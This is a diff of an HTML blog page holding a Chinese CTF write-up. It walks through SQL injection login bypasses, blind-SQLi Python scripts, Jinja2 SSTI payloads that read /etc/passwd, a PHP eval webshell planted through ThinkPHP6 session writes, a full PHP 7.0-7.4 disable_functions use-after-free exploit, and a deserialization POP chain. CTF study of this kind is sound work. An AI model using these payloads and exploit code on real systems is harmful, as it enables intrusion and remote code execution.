@@ -9,7 +9,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582678889839">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582682911863">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 <link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
 
@@ -30,7 +30,7 @@
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
       <a class="site-title-container" href="https://guokeya.github.io">
-        <img src="https://guokeya.github.io/images/avatar.png?v=1582678889839" class="site-logo">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582682911863" class="site-logo">
         <h1 class="site-title">过客</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
@@ -96,11 +96,11 @@
             <div class="post-date">2020-02-23</div>
             
             <div class="post-content">
-              <p>太菜了。只能纪录下自己做出来的题</p>
-<center>MISC</center>
-1。code_in_morse
-题目给了个数据包。拿到数据包首先就是看HTTP
-![](https://guokeya.github.io/post-images/1582507063277.png)
+              <p>太菜了。只能纪录下自己做出来的题<br>
+MISC<br>
+1。code_in_morse<br>
+题目给了个数据包。拿到数据包首先就是看HTTP<br>
+<img src="https://guokeya.github.io/post-images/1582507063277.png" alt="" loading="lazy"></p>
 <!-- more -->
 <p>可以看到。上传了一个image。尝试看看image图片。一般图片都会藏点什么东西。<br>
 摩斯密码。<br>
@@ -137,7 +137,7 @@ F5隐写得到flag<br>
 修改图片长度。得到part4<br>
 <img src="https://guokeya.github.io/post-images/1582509960998.png" alt="" loading="lazy"><br>
 第五关。猪圈密码。得到解压密码fojiajielv<br>
-并且给了81张图。慢慢拼图吧🙄<br>
+并且给了81张图。慢慢拼图吧<br>
 <img src="https://guokeya.github.io/post-images/1582510831489.png" alt="" loading="lazy"><br>
 第六关。与佛论禅解压得到密码amtf12345<br>
 图片末尾发现摩斯密码<br>
@@ -180,141 +180,142 @@ f.close()
 data2=data[::-1]
 print data2
 </code></pre>
-<p>得到flag.wav最后。就是考听力了。告辞😭</p>
-<center>Web</center>
-**简单的招聘系统**
-在登陆出发现admin' or 1=1%23可以登陆为admin。猜测这里有注入
-![](https://guokeya.github.io/post-images/1582513974012.png)
-判断字段数。6的时候报错。说明字段数为5
-登陆后。会在用户信息回显
-![](https://guokeya.github.io/post-images/1582514046115.png)
-没过滤。送分题。还有一种解法，通过or 1=1登陆后。在admin查询页面。注入
-**easysqli_copy**
-![](https://guokeya.github.io/post-images/1582514119329.png)
-首先分析下代码
-通过id传参。如果没有传参。就从数据库中取值作为默认
-id传参需要过正则匹配。数据库编码为UTF-8。然后用预处理带入sql语句
-``https://www.freebuf.com/articles/web/216336.html``
-UTF-8想起宽字节注入可以逃逸单引号。然后用%00注释
-用堆叠注入hex编码绕过。随便注
-![](https://guokeya.github.io/post-images/1582514494044.png)
-**Blacklist**
-原题是强网杯的随便注
-原本的思路是动过堆叠注入。更改表名或者利用prepare去读取数据
-但这题新增了一个黑名单。限制了以上两种操作使用的函数
-一直没啥思路。知识面太窄了😅
-结束后。大佬们用handler来代替select查询
-handler使用方法：``https://dev.mysql.com/doc/refman/8.0/en/handler.html``
-```
-HANDLER tbl_name OPEN [ [AS] alias]
-<p>HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...)<br>
-[ WHERE where_condition ] [LIMIT ... ]<br>
-HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }<br>
-[ WHERE where_condition ] [LIMIT ... ]<br>
-HANDLER tbl_name READ { FIRST | NEXT }<br>
-[ WHERE where_condition ] [LIMIT ... ]</p>
-<p>HANDLER tbl_name CLOSE</p>
-<pre><code>handler 表名 open   可选参数：as别名
-#打开表返回一个句柄
-handler 表名 read first
-#读取第一条数据
-handler 表名 close
-#关闭句柄
-![](https://guokeya.github.io/post-images/1582425638810.png)
+<p>得到flag.wav最后。就是考听力了。告辞<br>
+Web<br>
+简单的招聘系统</p>
+<p>在登陆出发现admin' or 1=1%23可以登陆为admin。猜测这里有注入<br>
+<img src="https://guokeya.github.io/post-images/1582513974012.png" alt="" loading="lazy"><br>
+判断字段数。6的时候报错。说明字段数为5<br>
+登陆后。会在用户信息回显<br>
+<img src="https://guokeya.github.io/post-images/1582514046115.png" alt="" loading="lazy"><br>
+没过滤。送分题。还有一种解法，通过or 1=1登陆后。在admin查询页面。注入<br>
+easysqli_copy<br>
+<img src="https://guokeya.github.io/post-images/1582514119329.png" alt="" loading="lazy"><br>
+首先分析下代码<br>
+通过id传参。如果没有传参。就从数据库中取值作为默认<br>
+id传参需要过正则匹配。数据库编码为UTF-8。然后用预处理带入sql语句<br>
+<code>https://www.freebuf.com/articles/web/216336.html</code><br>
+UTF-8想起宽字节注入可以逃逸单引号。然后用%00注释<br>
+用堆叠注入hex编码绕过。随便注<br>
+<img src="https://guokeya.github.io/post-images/1582514494044.png" alt="" loading="lazy"><br>
+Blacklist<br>
+原题是强网杯的随便注<br>
+原本的思路是动过堆叠注入。更改表名或者利用prepare去读取数据<br>
+但这题新增了一个黑名单。限制了以上两种操作使用的函数<br>
+一直没啥思路。知识面太窄了<br>
+结束后。大佬们用handler来代替select查询<br>
+handler使用方法：<code>https://dev.mysql.com/doc/refman/8.0/en/handler.html</code></p>
+<pre><code>HANDLER tbl_name OPEN [ [AS] alias]
 
-首先查看表名得到FlagHere
-![](https://guokeya.github.io/post-images/1582425889129.png)
-得到列名flag
-![](https://guokeya.github.io/post-images/1582425927117.png)
-得到flag
-![](https://guokeya.github.io/post-images/1582425989391.png)
-**ezupload**
-这题没什么好说的。直接上传一句话木马。执行/readflag得到flag
-**盲注**
-由于已知字段。并且在同表。那就不需要select
-![](https://guokeya.github.io/post-images/1582515117678.png)
-regexp判断即可
-**Flaskapp**
-在解密处存在SSTI。将``{{1+1}}``base64编码后发送。返回``{{2}}``
-随便输入个字符。存在报错。并且hint页面提示PIN。
-之前看到过一篇文章。利用SSTI构造PIN码。执行任意代码
-``https://www.anquanke.com/post/id/197602``
-以下是我的payload：
+HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...)
+    [ WHERE where_condition ] [LIMIT ... ]
+HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
+    [ WHERE where_condition ] [LIMIT ... ]
+HANDLER tbl_name READ { FIRST | NEXT }
+    [ WHERE where_condition ] [LIMIT ... ]
+
+HANDLER tbl_name CLOSE
 </code></pre>
-<p>[].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[134].<strong>init</strong>.<strong>globals</strong>['<strong>builtins</strong>']<a href="'/etc/passwd','r'">'open'</a>.read()</p>
-<p>{% for c in [].<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>() %}<br>
-{% if c.<strong>name</strong>=='catch_warnings' %}<br>
-{{ c.<strong>init</strong>.<strong>globals</strong>['<strong>builtins</strong>'].open('filename', 'r').read() }}<br>
-{% endif %}{% endfor %}</p>
-<pre><code>1：读取/sys/class/net/eth0/address
-2：如果存在/proc/self/cgroup文件。那么/etc/machine-id会取/proc/self/cgroup的第一行
-3：读取/etc/passwd得到用户名
-4：debug报错得到app路径
-![](https://guokeya.github.io/post-images/1582515443898.png)
-![](https://guokeya.github.io/post-images/1582516025637.png)
-**ezsqli**
-这道题考的是高版本mysql的特性。比如新增了数据库。可以用于绕过information被过滤
-最后字符串比较。拿flag
-不多说了。直接上脚本
+<p>handler 表名 open   可选参数：as别名<br>
+#打开表返回一个句柄<br>
+handler 表名 read first<br>
+#读取第一条数据<br>
+handler 表名 close<br>
+#关闭句柄<br>
+<img src="https://guokeya.github.io/post-images/1582425638810.png" alt="" loading="lazy"></p>
+<p>首先查看表名得到FlagHere<br>
+<img src="https://guokeya.github.io/post-images/1582425889129.png" alt="" loading="lazy"><br>
+得到列名flag<br>
+<img src="https://guokeya.github.io/post-images/1582425927117.png" alt="" loading="lazy"><br>
+得到flag<br>
+<img src="https://guokeya.github.io/post-images/1582425989391.png" alt="" loading="lazy"><br>
+ezupload<br>
+这题没什么好说的。直接上传一句话木马。执行/readflag得到flag<br>
+盲注<br>
+由于已知字段。并且在同表。那就不需要select<br>
+<img src="https://guokeya.github.io/post-images/1582515117678.png" alt="" loading="lazy"><br>
+regexp判断即可<br>
+Flaskapp<br>
+在解密处存在SSTI。将<code>{{1+1}}</code>base64编码后发送。返回<code>{{2}}</code><br>
+随便输入个字符。存在报错。并且hint页面提示PIN。<br>
+之前看到过一篇文章。利用SSTI构造PIN码。执行任意代码<br>
+<code>https://www.anquanke.com/post/id/197602</code><br>
+以下是我的payload：</p>
+<pre><code>[].__class__.__base__.__subclasses__()[134].__init__.__globals__['__builtins__']['open']('/etc/passwd','r').read()
+
+{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__=='catch_warnings' %}
+{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}
+{% endif %}{% endfor %}
 </code></pre>
-<p>slist='uabcdefghijkmnlopqrstvwxyzABCDEFGHIJKMNLOPQRSTUVWXYZ<a href=""></a>,{}_1234567890-'<br>
-import requests<br>
-for i in range(1,60):<br>
-for a in slist:<br>
-payload='0^(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer),'+str(i)+',1))='+str(ord(a))+')'<br>
-data={&quot;id&quot;:payload}<br>
-r=requests.post(url='http://b539562b497746f9b3a26355ea0835a8400621d5d6294eff.changame.ichunqiu.com/index.php',data=data)<br>
-if 'Nu1L' in r.text:<br>
-print (a)<br>
-break</p>
-<pre><code>通过sys这个库。跑出表名f1ag_1s_h3r3_hhhhh
-然后通过字符串比较。获得flag
+<p>1：读取/sys/class/net/eth0/address<br>
+2：如果存在/proc/self/cgroup文件。那么/etc/machine-id会取/proc/self/cgroup的第一行<br>
+3：读取/etc/passwd得到用户名<br>
+4：debug报错得到app路径<br>
+<img src="https://guokeya.github.io/post-images/1582515443898.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1582516025637.png" alt="" loading="lazy"><br>
+ezsqli<br>
+这道题考的是高版本mysql的特性。比如新增了数据库。可以用于绕过information被过滤<br>
+最后字符串比较。拿flag<br>
+不多说了。直接上脚本</p>
+<pre><code>slist='uabcdefghijkmnlopqrstvwxyzABCDEFGHIJKMNLOPQRSTUVWXYZ[](),{}_1234567890-'
+import requests
+for i in range(1,60):
+    for a in slist:
+        payload='0^(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer),'+str(i)+',1))='+str(ord(a))+')'
+        data={&quot;id&quot;:payload}
+        r=requests.post(url='http://b539562b497746f9b3a26355ea0835a8400621d5d6294eff.changame.ichunqiu.com/index.php',data=data)
+        if 'Nu1L' in r.text:
+            print (a)
+            break
 </code></pre>
-<p>import requests<br>
-flag=''<br>
-url='http://b539562b497746f9b3a26355ea0835a8400621d5d6294eff.changame.ichunqiu.com/index.php'<br>
-for i in range(100):<br>
-for a in range(40,130):<br>
-payload='((select 1,0x'+flag+hex(a).replace('0x','')+')&lt;(select * from f1ag_1s_h3r3_hhhhh))'<br>
-data={&quot;id&quot;:payload}<br>
-r=requests.post(url=url,data=data)<br>
-if 'Nu1L' not in (r.text):<br>
-print (chr(a-1))<br>
-flag+=hex(a-1).replace('0x','')<br>
-break</p>
-<pre><code>这里字符串比较。不区分大小写。
-如果区分大小写。可以用binary具体检测。这题过滤了in。就不行了。
-![](https://guokeya.github.io/post-images/1582521792220.png)
-**easy_thinking**
-www.zip源码泄露
-根据源码可知。这是个thinkphp6搭建的web。
-![](https://guokeya.github.io/post-images/1582635970537.png)
-哎。一直没怎么学thinkphp😥
-先百度下thinkphp6有啥洞
-``https://paper.seebug.org/1114/``
-搜了下发现就一个反序列化和session任意文件写入。
-![](https://guokeya.github.io/post-images/1582636167495.png)
-利用条件。需要session可控。并且能访问
-首先登陆下web
-![](https://guokeya.github.io/post-images/1582636294645.png)
-随便搜索个123。返回主页。有历史搜索纪录。
-![](https://guokeya.github.io/post-images/1582636341872.png)
-并且。这里session可以访问
-![](https://guokeya.github.io/post-images/1582636425249.png)
-结合上面的洞。我们将session替换为总长32位的xxxxx.php
-然后搜索内容会以序列化后的字符串存储。
-登陆时修改session。搜索``&lt;?php eval($_POST[a])?&gt;``。
-就会在session目录下存在一个sess_xxxxxx.php
-![](https://guokeya.github.io/post-images/1582636620721.png)
-![](https://guokeya.github.io/post-images/1582636670686.png)
-这就是我们的shell
-![](https://guokeya.github.io/post-images/1582636732345.png)
-phpinfo()发现禁用了很多函数。照常得bypass disable_function
-但是。用的比较多的LD_PRELOADbypass不行了。这里禁用了send_mail
-![](https://guokeya.github.io/post-images/1582636926794.png)
-有很多bypass方法。这里使用其他一个
+<p>通过sys这个库。跑出表名f1ag_1s_h3r3_hhhhh<br>
+然后通过字符串比较。获得flag</p>
+<pre><code>import requests
+flag=''
+url='http://b539562b497746f9b3a26355ea0835a8400621d5d6294eff.changame.ichunqiu.com/index.php'
+for i in range(100):
+    for a in range(40,130):
+        payload='((select 1,0x'+flag+hex(a).replace('0x','')+')&lt;(select * from f1ag_1s_h3r3_hhhhh))'
+        data={&quot;id&quot;:payload}
+        r=requests.post(url=url,data=data)
+        if 'Nu1L' not in (r.text):
+            print (chr(a-1))
+            flag+=hex(a-1).replace('0x','')
+            break
 </code></pre>
-<?php
+<p>这里字符串比较。不区分大小写。<br>
+如果区分大小写。可以用binary具体检测。这题过滤了in。就不行了。<br>
+<img src="https://guokeya.github.io/post-images/1582521792220.png" alt="" loading="lazy"><br>
+easy_thinking<br>
+www.zip源码泄露<br>
+根据源码可知。这是个thinkphp6搭建的web。<br>
+<img src="https://guokeya.github.io/post-images/1582635970537.png" alt="" loading="lazy"><br>
+哎。一直没怎么学thinkphp<br>
+先百度下thinkphp6有啥洞<br>
+<code>https://paper.seebug.org/1114/</code><br>
+搜了下发现就一个反序列化和session任意文件写入。<br>
+<img src="https://guokeya.github.io/post-images/1582636167495.png" alt="" loading="lazy"><br>
+利用条件。需要session可控。并且能访问<br>
+首先登陆下web<br>
+<img src="https://guokeya.github.io/post-images/1582636294645.png" alt="" loading="lazy"><br>
+随便搜索个123。返回主页。有历史搜索纪录。<br>
+<img src="https://guokeya.github.io/post-images/1582636341872.png" alt="" loading="lazy"><br>
+并且。这里session可以访问<br>
+<img src="https://guokeya.github.io/post-images/1582636425249.png" alt="" loading="lazy"><br>
+结合上面的洞。我们将session替换为总长32位的xxxxx.php<br>
+然后搜索内容会以序列化后的字符串存储。<br>
+登陆时修改session。搜索<code>&lt;?php eval($_POST[a])?&gt;</code>。<br>
+就会在session目录下存在一个sess_xxxxxx.php<br>
+<img src="https://guokeya.github.io/post-images/1582636620721.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1582636670686.png" alt="" loading="lazy"><br>
+这就是我们的shell<br>
+<img src="https://guokeya.github.io/post-images/1582636732345.png" alt="" loading="lazy"><br>
+phpinfo()发现禁用了很多函数。照常得bypass disable_function<br>
+但是。用的比较多的LD_PRELOADbypass不行了。这里禁用了send_mail<br>
+<img src="https://guokeya.github.io/post-images/1582636926794.png" alt="" loading="lazy"><br>
+有很多bypass方法。这里使用其他一个</p>
+<pre><code>&lt;?php
 
 # PHP 7.0-7.4 disable_functions bypass PoC (*nix only)
 #
@@ -337,9 +338,9 @@ function pwn($cmd) {
         public $a;
         public function __destruct() { 
             global $backtrace; 
-            unset($this->a);
-            $backtrace = (new Exception)->getTrace(); # ;)
-            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
+            unset($this-&gt;a);
+            $backtrace = (new Exception)-&gt;getTrace(); # ;)
+            if(!isset($backtrace[1]['args'])) { # PHP &gt;= 7.4
                 $backtrace = debug_backtrace();
             }
         }
@@ -349,37 +350,37 @@ function pwn($cmd) {
         public $a, $b, $c, $d;
     }
 
-    function str2ptr(&$str, $p = 0, $s = 8) {
+    function str2ptr(&amp;$str, $p = 0, $s = 8) {
         $address = 0;
-        for($j = $s-1; $j >= 0; $j--) {
-            $address <<= 8;
+        for($j = $s-1; $j &gt;= 0; $j--) {
+            $address &lt;&lt;= 8;
             $address |= ord($str[$p+$j]);
         }
         return $address;
     }
 
     function ptr2str($ptr, $m = 8) {
-        $out = "";
-        for ($i=0; $i < $m; $i++) {
-            $out .= chr($ptr & 0xff);
-            $ptr >>= 8;
+        $out = &quot;&quot;;
+        for ($i=0; $i &lt; $m; $i++) {
+            $out .= chr($ptr &amp; 0xff);
+            $ptr &gt;&gt;= 8;
         }
         return $out;
     }
 
-    function write(&$str, $p, $v, $n = 8) {
+    function write(&amp;$str, $p, $v, $n = 8) {
         $i = 0;
-        for($i = 0; $i < $n; $i++) {
-            $str[$p + $i] = chr($v & 0xff);
-            $v >>= 8;
+        for($i = 0; $i &lt; $n; $i++) {
+            $str[$p + $i] = chr($v &amp; 0xff);
+            $v &gt;&gt;= 8;
         }
     }
 
     function leak($addr, $p = 0, $s = 8) {
         global $abc, $helper;
         write($abc, 0x68, $addr + $p - 0x10);
-        $leak = strlen($helper->a);
-        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
+        $leak = strlen($helper-&gt;a);
+        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }
         return $leak;
     }
 
@@ -390,18 +391,18 @@ function pwn($cmd) {
         $e_phentsize = leak($base, 0x36, 2);
         $e_phnum = leak($base, 0x38, 2);
 
-        for($i = 0; $i < $e_phnum; $i++) {
+        for($i = 0; $i &lt; $e_phnum; $i++) {
             $header = $base + $e_phoff + $i * $e_phentsize;
             $p_type  = leak($header, 0, 4);
             $p_flags = leak($header, 4, 4);
             $p_vaddr = leak($header, 0x10);
             $p_memsz = leak($header, 0x28);
 
-            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
+            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write
                 # handle pie
                 $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                 $data_size = $p_memsz;
-            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
+            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec
                 $text_size = $p_memsz;
             }
         }
@@ -414,9 +415,9 @@ function pwn($cmd) {
 
     function get_basic_funcs($base, $elf) {
         list($data_addr, $text_size, $data_size) = $elf;
-        for($i = 0; $i < $data_size / 8; $i++) {
+        for($i = 0; $i &lt; $data_size / 8; $i++) {
             $leak = leak($data_addr, $i * 8);
-            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
+            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
                 $deref = leak($leak);
                 # 'constant' constant check
                 if($deref != 0x746e6174736e6f63)
@@ -424,7 +425,7 @@ function pwn($cmd) {
             } else continue;
 
             $leak = leak($data_addr, ($i + 4) * 8);
-            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
+            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
                 $deref = leak($leak);
                 # 'bin2hex' constant check
                 if($deref != 0x786568326e6962)
@@ -437,8 +438,8 @@ function pwn($cmd) {
 
     function get_binary_base($binary_leak) {
         $base = 0;
-        $start = $binary_leak & 0xfffffffffffff000;
-        for($i = 0; $i < 0x1000; $i++) {
+        $start = $binary_leak &amp; 0xfffffffffffff000;
+        for($i = 0; $i &lt; 0x1000; $i++) {
             $addr = $start - 0x1000 * $i;
             $leak = leak($addr, 0, 7);
             if($leak == 0x10102464c457f) { # ELF header
@@ -465,7 +466,7 @@ function pwn($cmd) {
         # str_shuffle prevents opcache string interning
         $arg = str_shuffle(str_repeat('A', 79));
         $vuln = new Vuln();
-        $vuln->a = $arg;
+        $vuln-&gt;a = $arg;
     }
 
     if(stristr(PHP_OS, 'WIN')) {
@@ -474,17 +475,17 @@ function pwn($cmd) {
 
     $n_alloc = 10; # increase this value if UAF fails
     $contiguous = [];
-    for($i = 0; $i < $n_alloc; $i++)
+    for($i = 0; $i &lt; $n_alloc; $i++)
         $contiguous[] = str_shuffle(str_repeat('A', 79));
 
     trigger_uaf('x');
     $abc = $backtrace[1]['args'][0];
 
     $helper = new Helper;
-    $helper->b = function ($x) { };
+    $helper-&gt;b = function ($x) { };
 
     if(strlen($abc) == 79 || strlen($abc) == 0) {
-        die("UAF failed");
+        die(&quot;UAF failed&quot;);
     }
 
     # leaks
@@ -504,24 +505,24 @@ function pwn($cmd) {
 
     $binary_leak = leak($closure_handlers, 8);
     if(!($base = get_binary_base($binary_leak))) {
-        die("Couldn't determine binary base address");
+        die(&quot;Couldn't determine binary base address&quot;);
     }
 
     if(!($elf = parse_elf($base))) {
-        die("Couldn't parse ELF header");
+        die(&quot;Couldn't parse ELF header&quot;);
     }
 
     if(!($basic_funcs = get_basic_funcs($base, $elf))) {
-        die("Couldn't get basic_functions address");
+        die(&quot;Couldn't get basic_functions address&quot;);
     }
 
     if(!($zif_system = get_system($basic_funcs))) {
-        die("Couldn't get zif_system address");
+        die(&quot;Couldn't get zif_system address&quot;);
     }
 
     # fake closure object
     $fake_obj_offset = 0xd0;
-    for($i = 0; $i < 0x110; $i += 8) {
+    for($i = 0; $i &lt; 0x110; $i += 8) {
         write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
     }
 
@@ -530,97 +531,94 @@ function pwn($cmd) {
     write($abc, 0xd0 + 0x38, 1, 4); # internal func type
     write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
 
-    ($helper->b)($cmd);
+    ($helper-&gt;b)($cmd);
     exit();
 }
-```
-支持PHP7.0-7.4
-用蚁键上传后。直接访问就行
-![](https://guokeya.github.io/post-images/1582637136613.png)
-**babyphp**
-www.zip源码泄露
-首先看idnex.php
-![](https://guokeya.github.io/post-images/1582637303312.png)
-代码很简洁。文件包含action参数+.php
-判断是否登陆。登陆就调转update.php
-OK。继续看login.php
-![](https://guokeya.github.io/post-images/1582637440869.png)
-过滤了很多函数。接着会调用lib.php中User类的login函数。
-```
-    public function login() {
-        if(isset($_POST['username'])&&isset($_POST['password'])){
+</code></pre>
+<p>支持PHP7.0-7.4<br>
+用蚁键上传后。直接访问就行<br>
+<img src="https://guokeya.github.io/post-images/1582637136613.png" alt="" loading="lazy"><br>
+babyphp<br>
+www.zip源码泄露<br>
+首先看idnex.php<br>
+<img src="https://guokeya.github.io/post-images/1582637303312.png" alt="" loading="lazy"><br>
+代码很简洁。文件包含action参数+.php<br>
+判断是否登陆。登陆就调转update.php<br>
+OK。继续看login.php<br>
+<img src="https://guokeya.github.io/post-images/1582637440869.png" alt="" loading="lazy"><br>
+过滤了很多函数。接着会调用lib.php中User类的login函数。</p>
+<pre><code>    public function login() {
+        if(isset($_POST['username'])&amp;&amp;isset($_POST['password'])){
         $mysqli=new dbCtrl();
-        $this->id=$mysqli->login('select id,password from user where username=?');
-        if($this->id){
-        $_SESSION['id']=$this->id;  
+        $this-&gt;id=$mysqli-&gt;login('select id,password from user where username=?');
+        if($this-&gt;id){
+        $_SESSION['id']=$this-&gt;id;  
         $_SESSION['login']=1;
-        echo "你的ID是".$_SESSION['id'];
-        echo "你好！".$_SESSION['token'];
-        echo "<script>window.location.href='./update.php'</script>";
-        return $this->id;
+        echo &quot;你的ID是&quot;.$_SESSION['id'];
+        echo &quot;你好！&quot;.$_SESSION['token'];
+        echo &quot;&lt;script&gt;window.location.href='./update.php'&lt;/script&gt;&quot;;
+        return $this-&gt;id;
         }
     }
-```
-可以看到。login函数。又会调用dbCtrl类中的login函数。并且带一个sql语句
-继续追踪
-![](https://guokeya.github.io/post-images/1582637581038.png)
-这里sql语句。将使用预处理。然后执行。返回id
-使用了预处理。那么基本注入没了。除非数据库使用utf-8
-接下来看update.php
-![](https://guokeya.github.io/post-images/1582637723680.png)
-只要``session['login']=1``就会输出flag。并且update.php未登陆时只是echo 你还没有登陆。并没有exit退出。下面的语句会继续执行
-调用user类的update函数。
-将POST的age和nickname带入Info类。然后序列化。经过safe函数。替换。再反序列化
-```
-function safe($parm){
-    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
+</code></pre>
+<p>可以看到。login函数。又会调用dbCtrl类中的login函数。并且带一个sql语句<br>
+继续追踪<br>
+<img src="https://guokeya.github.io/post-images/1582637581038.png" alt="" loading="lazy"><br>
+这里sql语句。将使用预处理。然后执行。返回id<br>
+使用了预处理。那么基本注入没了。除非数据库使用utf-8<br>
+接下来看update.php<br>
+<img src="https://guokeya.github.io/post-images/1582637723680.png" alt="" loading="lazy"><br>
+只要<code>session['login']=1</code>就会输出flag。并且update.php未登陆时只是echo 你还没有登陆。并没有exit退出。下面的语句会继续执行<br>
+调用user类的update函数。<br>
+将POST的age和nickname带入Info类。然后序列化。经过safe函数。替换。再反序列化</p>
+<pre><code>function safe($parm){
+    $array= array('union','regexp','load','into','flag','file','insert',&quot;'&quot;,'\\',&quot;*&quot;,&quot;alter&quot;);
     return str_replace($array,'hacker',$parm);
 }
-```
-之前我做题有遇到过序列化字符串。经过替换。实现字符逃逸的。博客中有题解
-那么这不就有了。逃逸+反序列化字符串可控+构造POP链执行sql语句
-之前只做到了逃逸字符串。对于逃逸对象。实在是第一次遇见。也怪我想得太少。没想过能逃逸对象
-逃逸字符串原理就不讲了。
-![](https://guokeya.github.io/post-images/1582638132555.png)
-我们要做的就是逃逸对象给CtrlCase。然后执行反序列化。
-下面构造POP链
-![](https://guokeya.github.io/post-images/1582638210005.png)
-程序调用UpdateHelper类的时候。会在执行完触发__destruct函数。执行echo $this->sql
-而反序列化可以更改sql的值。将sql赋值为其他类。就可以触发tostring魔法函数
-![](https://guokeya.github.io/post-images/1582638347646.png)
-```
-User类调用UpdateHelper类
-UpdateHelper执行完触发__destruct。echo $this->sql
-将$this->sql赋值为User类。就会触发__toString魔法函数
-调用$this->nickname->update($this->age)
-$this->nickname为Info。调用update函数。由于不存在此函数。就会触发__call魔法函数
-调用$this->CtrlCase->login($argument[0])
-$this->CtrlCase为dbCtrl类。那么就会执行dbCtrl类的login函数。将参数作为sql语句执行
-```
-```这里call魔法函数。$name的值是想要调用函数名的值。带的参数是$argument```
-比如我调用xxx类的abc函数。而xxx类并没有这个函数。触发__call函数。那么name就是你想要调用函数的名字。argument才是真正的参数
-![](https://guokeya.github.io/post-images/1582638805260.png)
-```
-接下来追踪下sql语句。通过User类的$this->age传递。那么将age设为sql语句即可
+</code></pre>
+<p>之前我做题有遇到过序列化字符串。经过替换。实现字符逃逸的。博客中有题解<br>
+那么这不就有了。逃逸+反序列化字符串可控+构造POP链执行sql语句<br>
+之前只做到了逃逸字符串。对于逃逸对象。实在是第一次遇见。也怪我想得太少。没想过能逃逸对象<br>
+逃逸字符串原理就不讲了。<br>
+<img src="https://guokeya.github.io/post-images/1582638132555.png" alt="" loading="lazy"><br>
+我们要做的就是逃逸对象给CtrlCase。然后执行反序列化。<br>
+下面构造POP链<br>
+<img src="https://guokeya.github.io/post-images/1582638210005.png" alt="" loading="lazy"><br>
+程序调用UpdateHelper类的时候。会在执行完触发__destruct函数。执行echo $this-&gt;sql<br>
+而反序列化可以更改sql的值。将sql赋值为其他类。就可以触发tostring魔法函数<br>
+<img src="https://guokeya.github.io/post-images/1582638347646.png" alt="" loading="lazy"></p>
+<pre><code>User类调用UpdateHelper类
+UpdateHelper执行完触发__destruct。echo $this-&gt;sql
+将$this-&gt;sql赋值为User类。就会触发__toString魔法函数
+调用$this-&gt;nickname-&gt;update($this-&gt;age)
+$this-&gt;nickname为Info。调用update函数。由于不存在此函数。就会触发__call魔法函数
+调用$this-&gt;CtrlCase-&gt;login($argument[0])
+$this-&gt;CtrlCase为dbCtrl类。那么就会执行dbCtrl类的login函数。将参数作为sql语句执行
+</code></pre>
+<p><code>这里call魔法函数。$name的值是想要调用函数名的值。带的参数是$argument</code><br>
+比如我调用xxx类的abc函数。而xxx类并没有这个函数。触发__call函数。那么name就是你想要调用函数的名字。argument才是真正的参数<br>
+<img src="https://guokeya.github.io/post-images/1582638805260.png" alt="" loading="lazy"></p>
+<pre><code>接下来追踪下sql语句。通过User类的$this-&gt;age传递。那么将age设为sql语句即可
 由于执行完会返回两个结果。绑定id和password。那么我们就写
 select password,id from user where username='admin'
 返回的第一个时password。赋值给id
 而id又会输出。我们拿到password解密登陆就行了
-```
-以下是我的payload
-![](https://guokeya.github.io/post-images/1582639043125.png)
-先本地测试下。
-![](https://guokeya.github.io/post-images/1582639256270.png)
-因为我们是覆盖最后一个Ctrlcase。而我们输入又在此前
-所以。我们直接自己构造。"闭合前面
-```;s:8:"CtrlCase";```表示CtrlCase开始后面跟我们构造的object对象
-最后还得加上``}``表示整个序列化字符串结尾。
-总共222个字符。根据替换。*替换hacker。一次可以多5个字符。union替换。一次多1个字符。
-``*x44+unionx2=222``
-![](https://guokeya.github.io/post-images/1582640275345.png)
-将这串md5解密。得到yingyingying
-admin，yingyingying登陆拿flag
-![](https://guokeya.github.io/post-images/1582640333234.png)
+</code></pre>
+<p>以下是我的payload<br>
+<img src="https://guokeya.github.io/post-images/1582639043125.png" alt="" loading="lazy"><br>
+先本地测试下。<br>
+<img src="https://guokeya.github.io/post-images/1582639256270.png" alt="" loading="lazy"><br>
+因为我们是覆盖最后一个Ctrlcase。而我们输入又在此前<br>
